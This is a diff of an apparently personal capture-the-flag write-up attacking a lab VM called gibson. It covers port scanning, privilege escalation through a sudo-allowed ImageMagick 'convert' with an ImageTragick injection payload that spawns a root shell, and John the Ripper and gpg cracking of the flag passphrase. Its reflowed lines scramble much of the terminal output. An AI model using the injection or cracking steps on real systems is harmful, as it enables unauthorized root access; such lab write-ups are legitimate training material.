@@ -1,233 +1,267 @@
-$ sudo nmap -sS 192.168.56.101
-Password:
+$ sudo nmap -sS 192.168.56.101 Password:
 
-Starting Nmap 6.47 ( http://nmap.org ) at 2016-08-24 10:05 EDT
-Nmap scan report for 192.168.56.101
-Host is up (0.00092s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-MAC Address: 08:00:27:E0:A1:1E (Cadmus Computer Systems)
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-08-24 10:05 EDT Nmap scan report
+for 192.168.56.101 Host is up (0.00092s latency). Not shown: 998 closed ports
+PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http MAC Address:
+08:00:27:E0:A1:1E (Cadmus Computer Systems)
 
 Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds
 
 only thing at :80 is http://192.168.56.101/davinci.html
 
-first try: 
+first try:
 
-Sassinak:wfuzz warrenkopp$ ./wfuzz.py -w siph0n_subdomain_list.txt --hc 404 http://192.168.56.101/FUZZ > 8.24.2016_siph0n1.txt
-Sassinak:wfuzz warrenkopp$ cat 8.24.2016_siph0n1.txt 
-********************************************************
-* Wfuzz 2.1.3 - The Web Bruteforcer                      *
+Sassinak:wfuzz warrenkopp$ ./wfuzz.py -w siph0n_subdomain_list.txt --hc 404
+http://192.168.56.101/FUZZ > 8.24.2016_siph0n1.txt Sassinak:wfuzz warrenkopp$
+cat 8.24.2016_siph0n1.txt
+******************************************************** * Wfuzz 2.1.3 - The Web
+Bruteforcer                      *
 ********************************************************
 
-Target: http://192.168.56.101/FUZZ
-Total requests: 11611
+Target: http://192.168.56.101/FUZZ Total requests: 11611
 
 ==================================================================
-ID	Response   Lines      Word         Chars          Request    
+ID	Response   Lines      Word         Chars          Request
 ==================================================================
 
 
-Total time: 20.58885
-Processed Requests: 11611
-Filtered Requests: 11611
+Total time: 20.58885 Processed Requests: 11611 Filtered Requests: 11611
 Requests/sec.: 563.9459
 
 
-derp. geek trivia ftw. 
+derp. geek trivia ftw.
 
 davinci.html: <screenshot>
 
-$ ssh margo@192.168.56.101
-Ubuntu 14.04.3 LTS
-margo@192.168.56.101's password: 
+$ ssh margo@192.168.56.101 Ubuntu 14.04.3 LTS margo@192.168.56.101's password:
 Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com/
 
   System information as of Wed Aug 24 15:35:48 BST 2016
 
-  System load:  0.0               Processes:             149
-  Usage of /:   83.9% of 1.85GB   Users logged in:       0
-  Memory usage: 37%               IP address for eth0:   192.168.56.101
-  Swap usage:   0%                IP address for virbr0: 192.168.122.1
+  System load:  0.0               Processes:             149 Usage of /:   83.9%
+  of 1.85GB   Users logged in:       0 Memory usage: 37%               IP
+  address for eth0:   192.168.56.101 Swap usage:   0%                IP address
+  for virbr0: 192.168.122.1
 
-  Graph this data and manage this system at:
-    https://landscape.canonical.com/
+  Graph this data and manage this system at: https://landscape.canonical.com/
 
-New release '16.04.1 LTS' available.
-Run 'do-release-upgrade' to upgrade to it.
+New release '16.04.1 LTS' available. Run 'do-release-upgrade' to upgrade to it.
 
-Last login: Wed Aug 24 15:35:48 2016 from 192.168.56.1
-margo@gibson:~$ 
-margo@gibson:~$ whoami
-margo
-margo@gibson:~$ id
-uid=1002(margo) gid=1002(margo) groups=1002(margo),27(sudo)
+Last login: Wed Aug 24 15:35:48 2016 from 192.168.56.1 margo@gibson:~$
+margo@gibson:~$ whoami margo margo@gibson:~$ id uid=1002(margo) gid=1002(margo)
+groups=1002(margo),27(sudo)
 
-sudo? 
+sudo?
 
-$ sudo -l 
+$ sudo -l
 
 list everything margo can do...
 
-margo@gibson:~$ sudo -l
-Matching Defaults entries for margo on gibson:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+margo@gibson:~$ sudo -l Matching Defaults entries for margo on gibson:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
-User margo may run the following commands on gibson:
-    (ALL) NOPASSWD: /usr/bin/convert
-    
-? what is convert ? 
-  
-margo@gibson:~$ convert --version
-Version: ImageMagick 6.7.7-10 2014-03-06 Q16 http://www.imagemagick.org
-Copyright: Copyright (C) 1999-2012 ImageMagick Studio LLC
-Features: OpenMP  
+User margo may run the following commands on gibson: (ALL) NOPASSWD:
+/usr/bin/convert
+
+? what is convert ?
+
+margo@gibson:~$ convert --version Version: ImageMagick 6.7.7-10 2014-03-06 Q16
+http://www.imagemagick.org Copyright: Copyright (C) 1999-2012 ImageMagick Studio
+LLC Features: OpenMP
 
 OIC . . . predates 6.9.3 listed on imagetragick.com...so...
 
-margo@gibson:~$ sudo convert 'https://example.com";\bin\sh"' out.png
-sh: 1: binsh: not found
-convert.im6: delegate failed `"curl" -s -k -o "%o" "https:%M"' @ error/delegate.c/InvokeDelegate/1065.
-convert.im6: unable to open image `/tmp/magick-0hp3Ev9X': No such file or directory @ error/blob.c/OpenBlob/2638.
-convert.im6: unable to open file `/tmp/magick-0hp3Ev9X': No such file or directory @ error/constitute.c/ReadImage/583.
-convert.im6: no images defined `out.png' @ error/convert.c/ConvertImageCommand/3044.
+margo@gibson:~$ sudo convert 'https://example.com";\bin\sh"' out.png sh: 1:
+binsh: not found convert.im6: delegate failed `"curl" -s -k -o "%o" "https:%M"'
+@ error/delegate.c/InvokeDelegate/1065. convert.im6: unable to open image
+`/tmp/magick-0hp3Ev9X': No such file or directory @ error/blob.c/OpenBlob/2638.
+convert.im6: unable to open file `/tmp/magick-0hp3Ev9X': No such file or
+directory @ error/constitute.c/ReadImage/583. convert.im6: no images defined
+`out.png' @ error/convert.c/ConvertImageCommand/3044.
 
-wtf? oh. slashes going the wrong way. derp. 
+wtf? oh. slashes going the wrong way. derp.
 
 margo@gibson:~$ sudo convert 'https://example.com";/bin/sh"' out.png
 # id    
 uid=0(root) gid=0(root) groups=0(root)
-# cd /
-# ls home
+# cd / ls home
 duke  eugene  margo
-# ls home/duke
-# ls home/eugene
+# ls home/duke ls home/eugene
 spin64
 # ls /home/eugene/spin64
 /home/eugene/spin64
 # ls -la /home/eugene
-total 56
-drwxr-xr-x 6 eugene eugene 4096 May 14 14:31 .
-drwxr-xr-x 5 root   root   4096 May  5 18:49 ..
--rw-r--r-- 1 eugene eugene  220 Apr  9  2014 .bash_logout
--rw-r--r-- 1 eugene eugene 3637 Apr  9  2014 .bashrc
-drwx------ 2 eugene eugene 4096 May  5 19:10 .cache
-drwx------ 3 eugene eugene 4096 May  5 20:12 .dbus
-drwx------ 3 eugene eugene 4096 May 14 14:22 .gconf
--rw-r--r-- 1 eugene eugene  675 Apr  9  2014 .profile
--rwxrwxr-x 1 eugene eugene 8589 May  5 19:10 spin64
--rw------- 1 root   root   4737 May 14 14:24 .viminfo
-drwxr-x--x 2 eugene eugene 4096 May  5 20:12 .virt-manager
+total 56 drwxr-xr-x 6 eugene eugene 4096 May 14 14:31 . drwxr-xr-x 5 root   root
+  4096 May  5 18:49 .. -rw-r--r-- 1 eugene eugene  220 Apr  9  2014 .bash_logout
+-rw-r--r-- 1 eugene eugene 3637 Apr  9  2014 .bashrc drwx------ 2 eugene eugene
+4096 May  5 19:10 .cache drwx------ 3 eugene eugene 4096 May  5 20:12 .dbus
+drwx------ 3 eugene eugene 4096 May 14 14:22 .gconf -rw-r--r-- 1 eugene eugene 
+675 Apr  9  2014 .profile -rwxrwxr-x 1 eugene eugene 8589 May  5 19:10 spin64
+-rw------- 1 root   root   4737 May 14 14:24 .viminfo drwxr-x--x 2 eugene eugene
+4096 May  5 20:12 .virt-manager
 # nano /home/eugene/spin64
 /bin/sh: 18: nano: not found
-
+/
 Move this somewhere i can grab it...
 
 # cp /home/eugene/spin64
-
+# 
 <screenshot>
 
-No idea wtf. I guess a binary? strings tells me nothing. moving on. 
+No idea wtf. I guess a binary? strings tells me nothing. moving on.
 
-rastamouse again saves my behind. 
+rastamouse again saves my behind.
 
 # netstat -a
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State      
-tcp        0      0 192.168.122.1:domain    *:*                     LISTEN     
-tcp        0      0 *:ssh                   *:*                     LISTEN     
-tcp        0      0 localhost:5900          *:*                     LISTEN     
-tcp        0      0 192.168.56.101:ssh      192.168.56.1:51250      ESTABLISHED
-tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
-tcp6       0      0 [::]:http               [::]:*                  LISTEN     
-udp        0      0 *:44766                 *:*                                
-udp        0      0 192.168.122.1:domain    *:*                                
-udp        0      0 *:bootps                *:*                                
-udp        0      0 *:bootpc                *:*                                
-udp6       0      0 [::]:25130              [::]:*    
+Active Internet connections (servers and established) Proto Recv-Q Send-Q Local
+Address           Foreign Address         State tcp        0      0
+192.168.122.1:domain    *:*                     LISTEN tcp        0      0 *:ssh
+                  *:*                     LISTEN tcp        0      0
+localhost:5900          *:*                     LISTEN tcp        0      0
+192.168.56.101:ssh      192.168.56.1:51250      ESTABLISHED tcp6       0      0
+[::]:ssh                [::]:*                  LISTEN tcp6       0      0
+[::]:http               [::]:*                  LISTEN udp        0      0
+*:44766                 *:* udp        0      0 192.168.122.1:domain    *:* udp 
+      0      0 *:bootps                *:* udp        0      0 *:bootpc         
+      *:* udp6       0      0 [::]:25130              [::]:*
 
 5900 is VNC. so lets send that somewhere i can connect to...
 
 cat /etc/sudoers to do some more recon
 
 # cat /etc/sudoers
-#
+# #
 # This file MUST be edited with the 'visudo' command as root.
-#
-# Please consider adding local content in /etc/sudoers.d/ instead of
-# directly modifying this file.
-#
+# #
+# Please consider adding local content in /etc/sudoers.d/ instead of directly
+# modifying this file.
+# #
 # See the man page for details on how to write a sudoers file.
-#
-Defaults	env_reset
-Defaults	mail_badpass
-Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+# #
+Defaults	env_reset Defaults	mail_badpass
+Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
+:/bin"
 
 # Host alias specification
-
+# 
 # User alias specification
-
+# 
 # Cmnd alias specification
-
+# 
 # User privilege specification
 root	ALL=(ALL:ALL) ALL
 
 # Members of the admin group may gain root privileges
 %admin ALL=(ALL) ALL
-
+%
 # Allow members of group sudo to execute any command
 ## disabled after Margo's security incident
 ##%sudo	ALL=(ALL:ALL) ALL
-
+##%
 # Allow Margo to convert pictures from the FTP server
 margo ALL=(ALL) NOPASSWD: /usr/bin/convert
 # Allow eugene to manage virtual machines and visudo
-eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager 
-eugene ALL=(ALL:ALL)  /usr/sbin/visudo 
+eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager eugene ALL=(ALL:ALL) 
+/usr/sbin/visudo
 
 # See sudoers(5) for more information on "#include" directives:
-
+# 
 #includedir /etc/sudoers.d
-
+#
 virt-manager? <need link to project>
 
 remote x session?
 
-reconnect ssh with margo
-ssh -X 
-nope need .xauthority file. mkay. well i can privesc back to root. 
+reconnect ssh with margo ssh -X nope need .xauthority file. mkay. well i can
+privesc back to root.
 
 Last login: Wed Aug 24 15:35:54 2016 from 192.168.56.1
 /usr/bin/xauth:  file /home/margo/.Xauthority does not exist
 margo@gibson:~$ sudo convert 'https://example.com";/bin/sh"' out.png
 
-wtf. what about root. 
+wtf. what about root.
 
 # ls -la /home/margo
-total 36
-drwxr-xr-x 3 margo margo 4096 Aug 24 17:06 .
-drwxr-xr-x 5 root  root  4096 May  5 18:49 ..
--rw------- 1 margo margo  358 Aug 24 17:04 .bash_history
--rw-r--r-- 1 margo margo  220 Apr  9  2014 .bash_logout
--rw-r--r-- 1 margo margo 3637 Apr  9  2014 .bashrc
-drwx------ 2 margo margo 4096 May  7 13:06 .cache
--rw-r--r-- 1 margo margo  675 Apr  9  2014 .profile
--rw------- 1 root  root  2298 May  7 14:33 .viminfo
--rw------- 1 margo margo   52 Aug 24 17:06 .Xauthority
-# cp /home/margo/.Xauthority /root/
-# virt-manager 
+total 36 drwxr-xr-x 3 margo margo 4096 Aug 24 17:06 . drwxr-xr-x 5 root  root 
+4096 May  5 18:49 .. -rw------- 1 margo margo  358 Aug 24 17:04 .bash_history
+-rw-r--r-- 1 margo margo  220 Apr  9  2014 .bash_logout -rw-r--r-- 1 margo margo
+3637 Apr  9  2014 .bashrc drwx------ 2 margo margo 4096 May  7 13:06 .cache
+-rw-r--r-- 1 margo margo  675 Apr  9  2014 .profile -rw------- 1 root  root 
+2298 May  7 14:33 .viminfo -rw------- 1 margo margo   52 Aug 24 17:06 .Xauthority
+# cp /home/margo/.Xauthority /root/ virt-manager 
+# 
+(long ago had previously installed XQuartz) magic window just appeared!
 
-(long ago had previously installed XQuartz) 
-magic window just appeared!
-
-horsing around in the VM seemed of limited use(looking at others work.) however, 
+horsing around in the VM seemed of limited use(looking at others work.) however,
 as a hypervisor console, it shows me the vm image. after some scp fails
 
 <screenshot>
 
-i get the image file somewhere i can toy with it. 
+i get the image file somewhere i can toy with it.
 
+... time to shift gears. it's no longer a fun experiment to try and do
+everything native on OS X. Trying to mount an ext2 image on 10.12 caused a bunch
+of stuff it's not worth my time to troubleshoot, not when i can just fire up a
+Kali VM and have all the tools at my disposal.
+
+<musical interlude>
+
+In our new kali home, we find that there's a .trash file containing
+flag.txt.gpg.
+
+Various hints all point to something relating to Jonny Lee Miller, or one of his
+characters. Build a quick wordlist from his name and those characters, learn
+about JohnTheRipper
+
+where are the configs in Kali? /etc/john/john.conf and /usr/share/john how do
+you ad rules? drop them into /etc/john/john.conf yup, just in the middle of the
+file wait, why am i adding rules? Kore Logic rules(github link) are apparently
+the only way to get the most out of john. Specifically, everyone says that we
+need to run our wordlist through the l33t rules to generate a second wordlist to
+run against the flag.txt.gpg file with gpg
+
+then just a matter of running
+
+root@kali:~/Desktop# john --wordlist=gibson_wordlist.txt
+--rules=KoreLogicRulesL33t --stdout >> gibson_wordlist_l33t.txt Press 'q' or
+Ctrl-C to abort, almost any other key for status 1006p 0:00:00:00 100.00%
+(2016-08-31 15:04) 9145p/s Z3r0k001
+
+then it's a simple shell script(github link to file) to throw that list at the
+gpg until it opens the flag. root@kali:~/Desktop#
+/media/sf_Sass_Desktop/gibson_brute_poc.sh z3r0c001 gpg: CAST5 encrypted data
+gpg: encrypted with 1 passphrase gpg: decryption failed: bad key Z3r0c001 gpg:
+CAST5 encrypted data gpg: encrypted with 1 passphrase gpg: decryption failed:
+bad key z3r0c00l gpg: CAST5 encrypted data gpg: encrypted with 1 passphrase gpg:
+decryption failed: bad key Z3r0c00l gpg: CAST5 encrypted data gpg: encrypted
+with 1 passphrase gpg: decryption failed: bad key z3r0k001 gpg: CAST5 encrypted
+data gpg: encrypted with 1 passphrase gpg: decryption failed: bad key Z3r0k001
+gpg: CAST5 encrypted data gpg: encrypted with 1 passphrase gpg: decryption
+failed: bad key z3r0k00l gpg: CAST5 encrypted data gpg: encrypted with 1
+passphrase gpg: decryption failed: bad key Z3r0K00l gpg: CAST5 encrypted data
+gpg: encrypted with 1 passphrase gpg: WARNING: message was not integrity
+protected found Z3r0K00l
+
+
+this took me more than an hour b/c i didn't seed the wordlist with enough
+options. missing a captiol k prevented most of my efforts from working, and if i
+hadn't seen a working version from the other writeups, i could never have traced
+my mistake. Ultimately i had fed john with
+
+zerocool zerokool
+
+when john processed them it did not insert capitols for 'k' or 'c'. so it never
+generated the actual passphrase, 'Z3r0K00l" until i updated the list with the
+capitols. Lesson learned, if you're iterating, iterate the capitolization as
+well as anythiing else.
+
+<flag screenshot>
+
+I had hoped to not rely on copy/paste from other people's walkthroughs to
+complete this one, but that did not happen. Between my own mistakes and the
+detail and depth of this challenge, it took a lot more effort than i expected.
+but i learned a bunch as well, particularly about sudo and looking for network
+services. 
